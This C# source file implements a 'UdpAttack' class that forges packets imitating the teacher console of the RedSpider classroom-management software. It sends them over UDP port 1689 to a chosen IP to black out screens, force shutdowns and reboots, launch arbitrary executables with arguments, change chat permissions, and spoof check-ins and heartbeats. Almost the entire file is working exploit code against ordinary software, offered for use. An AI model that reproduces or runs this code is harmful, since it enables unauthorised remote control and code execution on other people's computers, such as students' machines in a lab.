using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using MythwareUdpAttack = T4CLLibrary.Mythware.UdpAttack;

namespace T4CLLibrary.RedSpider
{
    public static class UdpAttack
    {
        private readonly static byte[] openHeader =      { 0x10, 0xd, 0x0, 0x0, 0x40, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x10, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/, 0x6f, 0x0, 0x70, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0/*是否最大化*/, 0x0, 0x0, 0x0 };
        static byte[] blackScreenPayload =               { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1/*1:黑屏，2:解除*/, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/, /*start*/0xc0, 0xa8, 0xf8, 0x8b /*end. IP2 ...*/};
        private readonly static byte[] shutdownPayload = { 0x10, 0xd, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0/*1：强制；0：非强制*/, 0x0, 0x0, 0x0, /*start*/0xc0, 0xa8, 0xf8, 0x8b /*end. IP*/ };
        private readonly static byte[] rebootPayload =   { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0/*1：强制；0：非强制*/, 0x0, 0x0, 0x0, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/, /*start*/0xc0, 0xa8, 0xf8, 0x8b /*end. IP2 ...*/};
        static readonly byte[] allowSendMsgPayload =     { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4/*4：允许发送；8：不允许发送*/, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/, /*start*/0xc0, 0xa8, 0xf8, 0x8b /*end. IP2 ...*/ };
        private static byte[] requireCheckInPayload =    { 0x10, 0xd, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x0, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/, /*start*/0xc0, 0xa8, 0xf8, 0x8b /*end. IP2 ...*/ };
        static byte[] respondCheckInPayload =            { 0x10, 0xd, 0x0, 0x0, 0xa0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x20, 0x0, /*start*/0xc0, 0xa8, 0xf8, 0x81/*end. 老师IP地址*/ /*后接姓名*/};
        readonly static byte[] heartbeatHeader =         { 0x10, 0x1, 0x0, 0x0, 0xa0, 0x5, 0x0, 0x0, 0x94, 0x11, 0x0, 0x0, 0x8, 0x0, /*start*/0x41, 0x64, 0x6d, 0x69, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0/*end 用户名*/, 0xff, 0xff, 0xff, 0xff, /*start*/0x0, 0xc, 0x29, 0x1f, 0x6d, 0x2f/*end MAC地址*/, 0x0, 0x0, 0xf9, 0x6, 0x0, 0x0, /*后接电脑名，补全0x0至1420个Bytes*/ };

        private static void SendUdpPacket(string ip, int port, byte[] data)
        {
            using (var udpClient = new UdpClient())
            {
                udpClient.Connect(ip, port);
                udpClient.Send(data, data.Length);
            }
        }

        private static byte[] StringIPToByteArray(string ip)
        {
            if (IPAddress.TryParse(ip, out IPAddress ipAddress))
            {
                if(ipAddress.AddressFamily != AddressFamily.InterNetwork)
                {
                    throw new ArgumentException("IP address must be IPv4.", nameof(ip));
                }
                byte[] ipBytes = ipAddress.GetAddressBytes();
                return ipBytes;
            }
            else
            {
                throw new ArgumentException("Invalid IP address format.", nameof(ip));
            }
        }

        /// <summary>
        /// 发送黑屏数据包
        /// </summary>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口，默认为1689</param>
        /// <param userName="blackScreen">
        /// 黑屏还是解除黑屏，值的意思代表: 
        /// <para>true: 黑屏</para>
        /// <para>false: 解除黑屏</para>
        /// <para>默认值: true</para>
        /// </param>
        public static void SendBlackScreenPacket(string ip, int port = 1689, bool blackScreen = true)
        {
            List<Byte> payload = blackScreenPayload.Take(20).ToList();
            //byte[] payloadunblackScreen = { 0x10, 0xd, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xc0, 0xa8, 0xf8, 0x81, 0xc0, 0xa8, 0xf8, 0x8b };
            if (blackScreen)
            {
                payload[13] = 0x1; // 黑屏
            }
            else
            {
                payload[13] = 0x2; // 解除黑屏
            }

            var ipBytes = StringIPToByteArray(ip);
            var teacherIPBytes = new List<byte> { 0xff, 0xff, 0xff, 0xff };
            payload.AddRange(teacherIPBytes); // 添加全1的IP地址
            payload.AddRange(ipBytes);

            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 发送命令数据包
        /// </summary>
        /// <param userName="command">命令（可执行文件路径）</param>
        /// <param userName="args">参数</param>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口</param>
        /// <param userName="isMaximized">是否最大化</param>
        public static void SendCommandPacket(string command, string args, string ip, int port = 1689, bool isMaximized = false)
        {
            var packet = MakeCommandPacket(command, args,isMaximized);
            SendUdpPacket(ip, port, packet.ToArray());
        }

        /// <summary>
        /// 发送关机数据包
        /// </summary>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口号</param>
        /// <param userName="force">是否强制关机</param>
        public static void SendShutdownPacket(string ip, int port = 1689,bool force = false)
        {
            List<Byte> payload = shutdownPayload.Take(20).ToList();
            if (force)
            {
                payload[16] = 0x1; // 强制
            }
            else
            {
                payload[16] = 0x0; // 非强制
            }

            var ipBytes = StringIPToByteArray(ip);
            payload.AddRange(ipBytes);

            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 生成命令数据包
        /// </summary>
        /// <param userName="command">命令（可执行文件路径）</param>
        /// <param userName="args">参数</param>
        /// <param userName="isMaximized">是否最大化</param>
        /// <returns>命令数据包</returns>
        private static List<byte> MakeCommandPacket(string command, string args,bool isMaximized = false)
        {
            List<byte> packet = new List<byte>(openHeader);

            if (isMaximized)
            {
                packet[openHeader.Length - 4] = 0x1; // 设置为最大化
            }
            else
            {
                packet[openHeader.Length - 4] = 0x0; // 设置为非最大化
            }

            List<Byte> commandBytes = MythwareUdpAttack.FormatB4Send(command);
            while (commandBytes.Count < 0x261 - 0x5A + 1)
            {
                commandBytes.Add(0x0);
            }
            packet.AddRange(commandBytes);
            List<Byte> argsBytes = MythwareUdpAttack.FormatB4Send(args);
            while (argsBytes.Count < 0x469 - 0x262 + 1)
            {
                argsBytes.Add(0x0);
            }
            packet.AddRange(argsBytes);
            return packet;
        }

        /// <summary>
        /// 发送允许或不允许发送消息数据包
        /// </summary>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口</param>
        /// <param userName="allow">是否允许发送消息</param>
        public static void SendAllowChatPacket(string ip, int port = 1689, bool allow = true)
        {
            List<byte> payload = allowSendMsgPayload.Take(20).ToList();
            if (allow)
            {
                payload[13] = 0x4; // 允许发送
            }
            else
            {
                payload[13] = 0x8; // 不允许发送
            }
            byte[] teacherIPBytes = { 0xff, 0xff, 0xff, 0xff };
            List<byte> ipBytes = StringIPToByteArray(ip).ToList();
            payload.AddRange(teacherIPBytes); // 添加全1的IP地址
            payload.AddRange(ipBytes);

            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 发送重启数据包
        /// </summary>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口</param>
        /// <param userName="force">是否强置重启</param>
        public static void SendRebootPacket(string ip, int port = 1689, bool force = false)
        {
            List<Byte> payload = rebootPayload.Take(20).ToList();
            if (force)
            {
                payload[16] = 0x1; // 强制重启
            }
            else
            {
                payload[16] = 0x0; // 非强制重启
            }
            var ipBytes = StringIPToByteArray(ip);
            payload.AddRange(ipBytes);
            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 发送请求签到数据包
        /// </summary>
        /// <param userName="ip">IP地址</param>
        /// <param userName="port">端口</param>
        public static void SendRequireCheckInPacket(string ip, int port = 1689,string teacherIP = null)
        {
            List<byte> payload = requireCheckInPayload.Take(16).ToList();
            if (!string.IsNullOrEmpty(teacherIP))
            {
                var teacherIPBytes = StringIPToByteArray(teacherIP);
                payload.AddRange(teacherIPBytes);
            }
            else
            {
                byte[] defaultTeacherIP = { 0xff, 0xff, 0xff, 0xff }; // 默认全1的IP地址
                payload.AddRange(defaultTeacherIP);
            }
            var ipBytes = StringIPToByteArray(ip);
            payload.AddRange(ipBytes);
            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 发送回复签到数据包
        /// </summary>
        /// <param userName="name"></param>
        /// <param userName="ip"></param>
        /// <param userName="port"></param>
        /// <param userName="teacherIP">老师IP</param>
        public static void SendRespondCheckInPacket(string name, string ip, int port = 1689,string teacherIP = null)
        {
            List<byte> payload = respondCheckInPayload.Take(16).ToList();

            if (!string.IsNullOrEmpty(teacherIP))
            {
                var teacherIPBytes = StringIPToByteArray(teacherIP);
                payload.AddRange(teacherIPBytes);
            }
            else
            {
                byte[] defaultTeacherIP = { 0xff, 0xff, 0xff, 0xff }; // 默认全1的IP地址
                payload.AddRange(defaultTeacherIP);
            }

            List<byte> nameBytes = MythwareUdpAttack.FormatB4Send(name);
            if (nameBytes.Count > 1420)
            {
                nameBytes = nameBytes.Take(1420).ToList(); // 限制姓名长度为32字节
            }
            while (nameBytes.Count < 1420)
            {
                nameBytes.Add(0x0); // 填充到32字节
            }
            payload.AddRange(nameBytes);
            SendUdpPacket(ip, port, payload.ToArray());
        }

        /// <summary>
        /// 发送心跳数据包
        /// </summary>
        /// <param name="macAddr">mac地址</param>
        /// <param name="ip">IP</param>
        /// <param name="port">端口</param>
        /// <param name="userName">用户名</param>
        /// <param name="computerName">机器名</param>
        public static void SendHeartBeatPacket(PhysicalAddress macAddr, string ip, int port = 1689, string userName = "Admin", string computerName = "MyPC")
        {
            List<byte> packet = new List<byte>(heartbeatHeader);
            List<byte> nameBytes = Encoding.UTF8.GetBytes(userName).ToList();
            if (nameBytes.Count > 18)
            {
                nameBytes = nameBytes.Take(18).ToList(); // 限制姓名长度为32字节
            }
            while (nameBytes.Count < 18)
            {
                nameBytes.Add(0x0); // 填充到32字节
            }
            packet.RemoveRange(14, 18);
            packet.InsertRange(14, nameBytes); // 替换用户名部分

            packet.RemoveRange(36, 6);
            packet.InsertRange(36, macAddr.GetAddressBytes()); // 替换MAC地址部分

            byte[] macBytes = macAddr.GetAddressBytes();

            List<byte> computerNameBytes = MythwareUdpAttack.FormatB4Send(computerName);
            packet.AddRange(computerNameBytes);

            while (packet.Count < 1440)
            {
                packet.Add(0x0); // 填充到1440字节
            }

            SendUdpPacket(ip, port, packet.ToArray());
        }
    }
}
